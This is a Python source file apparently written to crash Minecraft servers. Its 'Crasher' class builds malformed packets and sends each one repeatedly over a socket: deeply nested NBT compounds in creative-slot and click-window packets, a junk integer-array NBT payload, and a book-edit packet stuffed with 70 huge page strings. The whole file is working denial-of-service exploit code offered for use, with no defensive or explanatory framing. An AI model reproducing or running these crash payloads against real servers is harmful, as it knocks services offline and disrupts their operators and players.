import random
import struct
import zlib
from random import Random

from nbt import nbt
from nbt.nbt import NBTFile, TAG_List, TAG_String, TAG_Compound, TAG_Int, TAG_Byte, TAG_END

import NBTSerializer
from Packet import Packet

import io

from client_packets.PacketPlayInSetCreativeSlot import PacketPlayInSetCreativeSlot
from player import PacketTranslator


class Crasher:

    def __init__(self):
        self.packet_id = b'\x17'
        self.data = bytearray()
    def creative_crasher(self, socket, packet_count):
        buffer = io.BytesIO()
        for i in range(256):
            buffer.write(NBTSerializer.serialize_tag_compount(name=f"e"))
            buffer.write(NBTSerializer.serialize_tag_string(name="", value="chujchujchuj32"))
        for i in range(256):
            buffer.write(NBTSerializer.serialize_tag_end())


        trash_packet = PacketPlayInSetCreativeSlot(slot_nr=1, item_id=3, item_count=12, item_damage=1, nbt_data=buffer.getvalue()).encode()
        translated = PacketTranslator.translate_packet_from_decompressed_to_compressed(packet_data=trash_packet, compression_threeshold=256)
        print(f"dlugosc syfu {len(trash_packet)}")
        for i in range(packet_count):
            socket.sendall(translated)
    def better_nbt(self, socket, packet_count):
        self.packet_id = b'\x0E'
        randoms = Random()
        buffer = io.BytesIO()
        buffer.write(NBTSerializer.serialize_tag_compount(name=""))
        buffer.write(NBTSerializer.serialize_trash_int_array())
        buffer.write(NBTSerializer.serialize_tag_end())

        self.data = (
                self.packet_id +
                struct.pack(">B", 0)  # window id
                + struct.pack(">h", 6)  # SLOT (SHORT)
                + struct.pack(">b", 0)  # button byte
                + struct.pack(">h", randoms.randint(a=1, b=5000))  # action number short
                + struct.pack(">b", 0)
                + struct.pack(">h", 386)
                + struct.pack(">b", 1)
                + struct.pack(">H", 1)
                + buffer.getvalue()
        )
        data_compressed = zlib.compress(self.data, level=6)
        # packet = Packet.encode_varint(500) + data_compressed
        packet = Packet.encode_varint(len(self.data)) + data_compressed
        final_packet = Packet.encode_varint(len(packet)) + packet
        for i in range(packet_count):
            socket.sendall(final_packet)





    def nbt1_crash(self, socket, packet_count):
        self.packet_id = b'\x0E'
        nbt_data = NBTFile()
        nbt_data.name = ""
        tag_property = TAG_Compound(name="tag")
        current_compound = tag_property
        #mylist = TAG_List(name="StoredEnchantments", type=TAG_String)
        r = Random()
        for i in range(300):
            next_compound = TAG_Compound(name=F"next_compound {r.randint(1,74123)}")
            current_compound.tags.append(next_compound)
            current_compound = next_compound
        current_compound.tags.append(TAG_String(name="ez", value="cra"))
        nbt_data.tags.append(tag_property)
        buffer = io.BytesIO()
        nbt_data.write_file(buffer=buffer, )
        randoms = Random()
        print(buffer)
        self.data = (
            self.packet_id +
            struct.pack(">B", 0) # window id
            + struct.pack(">h", 6) # SLOT (SHORT)
            + struct.pack(">b",0) # button byte
            + struct.pack(">h", randoms.randint(a=1,b=5000)) # action number short
            + struct.pack(">b", 0)
            + struct.pack(">h", 386)
            + struct.pack(">b", 1)
            + struct.pack(">H", 1)
            + buffer.getvalue()
        )
        data_compressed = zlib.compress(self.data, level=6)
        # packet = Packet.encode_varint(500) + data_compressed
        packet = Packet.encode_varint(len(self.data)) + data_compressed
        final_packet = Packet.encode_varint(len(packet)) + packet
        for i in range(packet_count):
            socket.sendall(final_packet)

        print(len(self.data))
        print(nbt_data.pretty_tree())


    def book_crash(self, socket,packet_count):
        nbt_data = NBTFile()
        nbt_data.name = ""
        mylist = TAG_List(name="pages", type=TAG_String)
        for i in range(70):
            mylist.append(TAG_String("drehguibgerjaoigjrieegrijijgearjigrjigrjigjigrhiuteutehifgwuegwihegwhieghigewihehrouiwgejiegwjiegjwijgegjegjgjeegjjgegjegejgejjegjegjegjegjegjgejegjegjegjegjgejegjgejegjgejegjjgejgejegjgejegjgejgejegjgejgejegjgejjegjegjegjegjgejgejegjgejegjegjegjegjjegjegjegjegjgejegjgejgjgejgjeegjgewhighihiweghijwegihwgehigwehigwehiwgehigewhigwbjgbgbwegbjqwi4tj4hffihfewhifehifweihefwjihfewihjweginhnhiwegnihegwinhwgenihgwniehgwenihwgjniejniogejoniegwjowgjojowjo"))
        nbt_data.tags.append(mylist)
        buffer = io.BytesIO()
        nbt_data.write_file(buffer=buffer, )



        self.data = (
            self.packet_id +
            Packet.write_string("MC|BEdit")
            + struct.pack(">h",386)
            + struct.pack('>b', 1)
            + struct.pack(">h", 1)
            + buffer.getvalue()
        )
        data_compressed = zlib.compress(self.data, level=6)
        #packet = Packet.encode_varint(500) + data_compressed
        packet = Packet.encode_varint(len(self.data)) + data_compressed
        final_packet = Packet.encode_varint(len(packet)) + packet
        for i in range(packet_count):
            socket.sendall(final_packet)

        print(len(self.data))




